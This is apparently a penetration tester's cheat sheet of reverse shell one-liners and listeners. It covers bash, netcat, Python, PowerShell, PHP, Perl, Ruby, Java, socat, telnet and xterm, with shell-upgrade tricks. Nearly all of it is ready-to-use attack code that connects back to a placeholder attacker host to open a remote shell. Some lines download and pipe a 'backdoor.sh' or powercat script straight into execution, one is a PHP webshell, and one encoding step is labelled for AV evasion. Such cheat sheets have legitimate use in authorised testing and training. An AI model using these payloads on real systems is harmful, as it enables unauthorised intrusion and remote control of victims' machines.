---
tags:
  - Execution
  - Exploitation
  - Foundational
  - Post_Exploitation
---

## Reverse Shells
resources: [RevShells Generator](https://www.revshells.com/), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

> Collection of reverse shell one-liners and listeners for various platforms.

> [!tip] **Payload Selection Guide:**
> - **Linux with bash:** Bash payload (most reliable)
> - **Linux without /dev/tcp:** Python or netcat mkfifo
> - **PHP web app:** PHP payload or php-reverse-shell.php
> - **Windows PowerShell:** PowerShell TCP client
> - **Windows no PS:** msfvenom exe
> - **Java/Tomcat:** msfvenom war
> - **AV evasion:** Encoded msfvenom

## Listeners

### Netcat Listener [Local]
```bash
nc -nvlp <Port>
```

```bash
rlwrap nc -lvnp <Port>
```

### Ncat with SSL [Local]
```bash
ncat --ssl -nvlp <Port>
```

### Socat Listener [Local]
```bash
socat TCP-LISTEN:<Port> -
```

```bash
socat file:`tty`,raw,echo=0 tcp-listen:<Port>
```

### Metasploit Handler [Local]
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run"
```

```bash
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run"
```

## Shell Upgrade

### Upgrading to Interactive Shell
> [!important] Upgrade basic shell to full TTY for tab completion, history, and job control.

#### Python PTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
```

#### Full TTY Upgrade
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

#### Script Command
```bash
script -qc /bin/bash /dev/null
export TERM=xterm
```

## Bash Reverse Shells

### Standard Bash TCP
```bash
bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1
```

### Bash with sh Wrapper [alternative]
```bash
bash -c "bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1"
```

### Bash Alternative Syntax
```bash
0<&196;exec 196<>/dev/tcp/<AttackerIP>/<Port>; sh <&196 >&196 2>&196
```

### Bash UDP [alternative]
```bash
sh -i >& /dev/udp/<AttackerIP>/<Port> 0>&1
```

> Listener: `nc -u -lvp <Port>`

### URL Encoded (for injection) [alternative]
```text
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<AttackerIP>%2F<Port>%200%3E%261%22
```

## Netcat Reverse Shells

### Traditional Netcat
```bash
nc -e /bin/bash <AttackerIP> <Port>
```

```bash
nc -e /bin/sh <AttackerIP> <Port>
```

### Netcat without -e [alternative]
> [!tip] Use this when **-e** flag is not available (common on BSD netcat).

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <AttackerIP> <Port> >/tmp/f
```

### Ncat
```bash
ncat <AttackerIP> <Port> -e /bin/bash
```

```bash
ncat --udp <AttackerIP> <Port> -e /bin/bash
```

### Windows Netcat
```cmd
nc <AttackerIP> <Port> -e cmd.exe
```

## Python Reverse Shells

### Linux IPv4
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<AttackerIP>",<Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python with PTY
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<AttackerIP>",<Port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Python with Environment Variables
```bash
export RHOST="<AttackerIP>";export RPORT=<Port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

### Python IPv6
```bash
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<IPv6Address>",<Port>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## PowerShell Reverse Shells

### PowerShell TCP Client
```powershell
$client = New-Object System.Net.Sockets.TCPClient('<AttackerIP>',<Port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Base64 Encode PowerShell [Local]
```bash
echo -n '<PowerShellCommand>' | iconv -t UTF-16LE | base64 -w 0
```

### Execute Base64 Encoded
```cmd
powershell -enc <Base64String>
```

### Powercat [alternative]
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<AttackerIP>/powercat.ps1');powercat -c <AttackerIP> -p <Port> -e powershell
```

## PHP Reverse Shells

### PHP System Call
```php
<?php system("bash -c 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1'"); ?>
```

### PHP Socket
```php
php -r '$sock=fsockopen("<AttackerIP>",<Port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Pentestmonkey PHP Shell [alternative]
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

### Simple PHP Webshell
```php
<?php system($_GET['cmd']); ?>
```

#### Use Webshell
```text
http://<Target>/shell.php?cmd=id
```

## Perl Reverse Shells

### Linux Perl
```bash
perl -e 'use Socket;$i="<AttackerIP>";$p=<Port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Perl Without /bin/sh
```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<AttackerIP>:<Port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Perl for Windows
```cmd
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<AttackerIP>:<Port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby Reverse Shells

### Standard Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("<AttackerIP>",<Port>).to_i; exec sprintf("/bin/sh -i<&%d >&%d 2>&%d",f,f,f)'
```

### Ruby Without /bin/sh
```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<AttackerIP>","<Port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Ruby for Windows
```ruby
ruby -rsocket -e 'c=TCPSocket.new("<AttackerIP>","<Port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Java Reverse Shell

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<AttackerIP>/<Port>;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Socat Reverse Shells

### Attacker Listener
```bash
socat file:`tty`,raw,echo=0 TCP-L:<Port>
```

### Victim Command
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<AttackerIP>:<Port>
```

### One-liner with Download
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<AttackerIP>:<Port>
```

## Telnet Reverse Shell

> Requires two listeners: one for input, one for output.

```bash
telnet <AttackerIP> <Port> | /bin/bash | telnet <AttackerIP> <Port2>
```

## Xterm Reverse Shell

### Start Listener on Attacker
> Listens on port 6001.

```bash
xnest :1
```

### Add Permission to Connect
```bash
xhost +<VictimIP>
```

### Connect from Victim
```bash
xterm -display <AttackerIP>:1
```

## Download and Execute

### Wget Script Download and Execute
```bash
wget -O- http://<AttackerIP>:<Port>/backdoor.sh | bash
```

### Curl Script Download and Execute
```bash
curl http://<AttackerIP>:<Port>/backdoor.sh | bash
```

## Kali Webshells Location [optional]

```bash
ls /usr/share/webshells/
```

> [!info] Common webshells:
> - `/usr/share/webshells/php/php-reverse-shell.php`
> - `/usr/share/webshells/php/simple-backdoor.php`
> - `/usr/share/webshells/asp/`
> - `/usr/share/webshells/jsp/`
